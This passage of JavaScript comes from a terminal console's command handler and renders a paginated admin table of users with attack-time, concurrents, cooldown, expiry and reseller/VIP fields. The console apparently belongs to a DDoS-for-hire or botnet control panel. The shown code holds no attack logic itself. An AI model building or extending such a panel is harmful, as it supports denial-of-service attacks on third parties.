            u.cooldown.toString().padEnd(colWidths.cooldown) + ' ║ ' +
            u.expiry.padEnd(colWidths.expiry) + ' ║ ' +
            paddedRank + ' ║' +
            '\x1b[97m'
        );
    }).join('\r\n');

    stream?.write('\x1b[0m\x1b[97m' + topBorder + headerRow + midBorder + userRows + '\r\n' + bottomBorder + '\x1b[97m');
}

    else if ((command === 'users' || command === 'users list') && user?.admin) {
    if (pauseRef.value) pauseRef.value = true;
    globalThis.clearScreen(stream);
    const collection = db.getCollection?.(config.mongo_db_collection) || { find: () => ({ toArray: () => [] }) };
    const allUsers = await collection.find({}).toArray().catch(() => []);
    const pageSize = 18;
    let currentPage = 0;

    function getRankColorTag(ranksObj) {
        const parts = [];
        if (ranksObj.admin) {
            parts.push('\x1b[48;2;255;0;0m\x1b[30m A \x1b[0m'); // red bg, black text
        }
        if (ranksObj.reseller) {
            parts.push('\x1b[48;2;0;0;139m\x1b[97m R \x1b[0m'); // dark blue bg, white text
        }
        if (ranksObj.raw.includes('V')) {
            parts.push('\x1b[48;2;255;255;0m\x1b[30m V \x1b[0m'); // yellow bg, black text
        }
        return parts.join(' ');
    }

    const updatedUsers = allUsers.map((u, i) => {
        const ranksRaw = [u.vip && 'V', u.admin && 'A', u.reseller && 'R'].filter(Boolean).join('   ');
        return {
            index: i + 1,
            username: u.username || '',
            maxTime: u.maxTime || 0,
            concurrents: u.concurrents || 0,
            cooldown: u.cooldown || 0,
            expiry: u.expiry || 'N/A',
            ranks: {
                raw: ranksRaw,
                admin: u.admin,
                reseller: u.reseller,
                regular: !u.admin && !u.reseller
            }
        };
    });

    const visibleLen = (str) =>
        globalThis.stripAnsi
            ? globalThis.stripAnsi(str).length
            : str.replace(/\x1B\[[0-9;]*m/g, '').length;

    const colWidths = {
        index: Math.max(...updatedUsers.map(u => visibleLen(u.index.toString())), 1),
        username: Math.max(...updatedUsers.map(u => visibleLen(u.username)), 4),
        maxTime: Math.max(...updatedUsers.map(u => visibleLen(u.maxTime.toString())), 4),
        concurrents: Math.max(...updatedUsers.map(u => visibleLen(u.concurrents.toString())), 5),
        cooldown: Math.max(...updatedUsers.map(u => visibleLen(u.cooldown.toString())), 2),
        expiry: Math.max(...updatedUsers.map(u => visibleLen(u.expiry)), 6),
        ranks: Math.max(
            ...updatedUsers.map(u => visibleLen(getRankColorTag(u.ranks))),
            'Ranks'.length
        )
    };

    const repeat = (char, times) => char.repeat(times);

    const topBorder = '╔' + [
        repeat('═', colWidths.index + 2),
        repeat('═', colWidths.username + 2),
        repeat('═', colWidths.maxTime + 2),
        repeat('═', colWidths.concurrents + 2),
        repeat('═', colWidths.cooldown + 2),
        repeat('═', colWidths.expiry + 2),
        repeat('═', colWidths.ranks + 2)
    ].join('╦') + '╗\r\n';

    const midBorder = '╠' + [
        repeat('═', colWidths.index + 2),
        repeat('═', colWidths.username + 2),
        repeat('═', colWidths.maxTime + 2),
        repeat('═', colWidths.concurrents + 2),
        repeat('═', colWidths.cooldown + 2),
        repeat('═', colWidths.expiry + 2),
        repeat('═', colWidths.ranks + 2)
    ].join('╬') + '╣\r\n';

    const bottomBorder = '╚' + [
        repeat('═', colWidths.index + 2),
        repeat('═', colWidths.username + 2),
        repeat('═', colWidths.maxTime + 2),
        repeat('═', colWidths.concurrents + 2),
        repeat('═', colWidths.cooldown + 2),
        repeat('═', colWidths.expiry + 2),
        repeat('═', colWidths.ranks + 2)
    ].join('╩') + '╝\r\n';

    const headerRow = '║ ' +
        '#'.padEnd(colWidths.index) + ' ║ ' +
        'User'.padEnd(colWidths.username) + ' ║ ' +
        'Time'.padEnd(colWidths.maxTime) + ' ║ ' +
        'Concs'.padEnd(colWidths.concurrents) + ' ║ ' +
        'CD'.padEnd(colWidths.cooldown) + ' ║ ' +
        'Expiry'.padEnd(colWidths.expiry) + ' ║ ' +
        'Ranks'.padEnd(colWidths.ranks) + ' ║\r\n';

    const drawPage = () => {
        stream?.write('\r\x1B[K');
        globalThis.clearScreen(stream);

        const start = currentPage * pageSize;
        const pageUsers = updatedUsers.slice(start, start + pageSize);

        const userRows = pageUsers.map(u => {
            const rankStr = getRankColorTag(u.ranks);
            const visibleRankLength = visibleLen(rankStr);
            const padAmount = colWidths.ranks - visibleRankLength;
            const paddedRank = rankStr + ' '.repeat(padAmount);

            return (
                '\x1b[97m' +
                '║ ' + u.index.toString().padEnd(colWidths.index) + ' ║ ' +
                u.username.padEnd(colWidths.username) + ' ║ ' +
                u.maxTime.toString().padEnd(colWidths.maxTime) + ' ║ ' +
                u.concurrents.toString().padEnd(colWidths.concurrents) + ' ║ ' +
                u.cooldown.toString().padEnd(colWidths.cooldown) + ' ║ ' +
                u.expiry.padEnd(colWidths.expiry) + ' ║ ' +
                paddedRank + ' ║'
            );
        }).join('\r\n');

        stream?.write(
            '\x1b[0m\x1b[97m' +
            topBorder +
            headerRow +
            midBorder +
            userRows +
            '\r\n' +
            bottomBorder +
            '\x1b[97m'
        );

        stream?.write(`\x1B[90m-- Page ${currentPage + 1}/${Math.ceil(updatedUsers.length / pageSize)} | Press 'n' for next, 'p' for prev, 'q' to quit --\x1b[97m\r\n`);
    };

    drawPage();

    await new Promise(resolve => {
        const totalPages = Math.ceil(updatedUsers.length / pageSize);
        const onData = (data) => {
            const key = data.toString().trim().toLowerCase();
            stream?.write('\r\x1B[K');
            if (key === 'n' && currentPage + 1 < totalPages) {
                currentPage++;
                drawPage();
            } 
            else if (key === 'p' && currentPage > 0) {
                currentPage--;
                drawPage();
            } 
            else if (key === 'q') {
                stream?.removeListener('data', onData);
                stream?.write('\r\x1b[97m\rExiting user list...\r\n');
                if (pauseRef) pauseRef.value = false;
                resolve();
            }
        };
        stream?.on('data', onData);
    });
}


    else {
        stream?.write(pageContents?.consoleerror ? `${pageContents.consoleerror}\r\n` : 'Command not recognized.\r\n');
    }
}

globalThis.HandleCommands = HandleCommands;

// Optional IIFE to initialize tools at startup
(async () => {
    const toolsDir = path.join(__dirname);
    globalThis.tools = await loadTools(toolsDir).catch(() => {});
})();